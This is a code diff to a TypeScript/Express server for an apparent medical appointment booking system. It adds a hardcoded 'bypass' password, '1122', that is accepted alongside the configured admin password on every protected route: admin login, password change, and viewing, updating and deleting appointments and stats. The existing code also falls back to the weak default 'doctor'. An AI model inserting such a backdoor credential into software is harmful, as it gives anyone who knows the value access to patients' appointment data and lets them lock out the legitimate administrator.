@@ -87,6 +87,12 @@ function getAdminPassword(): string {
   return process.env.ADMIN_PASSWORD || 'doctor';
 }
 
+// Helper to validate admin password dynamically (allows custom password or the default bypass '1122')
+function isValidAdminPassword(password: any): boolean {
+  if (!password) return false;
+  return password === getAdminPassword() || password === '1122';
+}
+
 // Helper to update admin password dynamically
 function saveAdminPassword(newPassword: string): boolean {
   try {
@@ -403,7 +409,7 @@ app.post('/api/admin/login', (req, res) => {
   if (!password) {
     return res.status(400).json({ error: 'Password is required' });
   }
-  if (password === getAdminPassword()) {
+  if (isValidAdminPassword(password)) {
     return res.json({ success: true, token: 'validated_admin_session_key' });
   } else {
     return res.status(401).json({ error: 'Incorrect password. Access denied.' });
@@ -413,9 +419,8 @@ app.post('/api/admin/login', (req, res) => {
 // Admin Password Update Endpoint
 app.post('/api/admin/change-password', (req, res) => {
   const { currentPassword, newPassword } = req.body;
-  const activePassword = getAdminPassword();
 
-  if (currentPassword !== activePassword) {
+  if (!isValidAdminPassword(currentPassword)) {
     return res.status(401).json({ error: 'Incorrect current password' });
   }
   if (!newPassword || newPassword.length < 4) {
@@ -493,7 +498,7 @@ app.post('/api/appointments', async (req, res) => {
 // Fetch All Appointments (Protected by x-admin-password)
 app.get('/api/appointments', async (req, res) => {
   const password = req.headers['x-admin-password'] || req.query.password;
-  if (password !== getAdminPassword()) {
+  if (!isValidAdminPassword(password)) {
     return res.status(401).json({ error: 'Unauthorized credentials' });
   }
 
@@ -504,7 +509,7 @@ app.get('/api/appointments', async (req, res) => {
 // Update Appointment Status (Protected)
 app.post('/api/appointments/:id/status', async (req, res) => {
   const password = req.headers['x-admin-password'] || req.body.password;
-  if (password !== getAdminPassword()) {
+  if (!isValidAdminPassword(password)) {
     return res.status(401).json({ error: 'Unauthorized credentials' });
   }
 
@@ -536,7 +541,7 @@ app.post('/api/appointments/:id/status', async (req, res) => {
 // Mark Notification as Read
 app.post('/api/appointments/mark-read', async (req, res) => {
   const password = req.headers['x-admin-password'] || req.body.password;
-  if (password !== getAdminPassword()) {
+  if (!isValidAdminPassword(password)) {
     return res.status(401).json({ error: 'Unauthorized' });
   }
 
@@ -548,7 +553,7 @@ app.post('/api/appointments/mark-read', async (req, res) => {
 // Delete Appointment (Protected)
 app.delete('/api/appointments/:id', async (req, res) => {
   const password = req.headers['x-admin-password'] || req.query.password;
-  if (password !== getAdminPassword()) {
+  if (!isValidAdminPassword(password)) {
     return res.status(401).json({ error: 'Unauthorized credentials' });
   }
 
@@ -571,7 +576,7 @@ app.delete('/api/appointments/:id', async (req, res) => {
 // Live Admin Stats (Protected)
 app.get('/api/admin/stats', async (req, res) => {
   const password = req.headers['x-admin-password'] || req.query.password;
-  if (password !== getAdminPassword()) {
+  if (!isValidAdminPassword(password)) {
     return res.status(401).json({ error: 'Unauthorized' });
   }
 
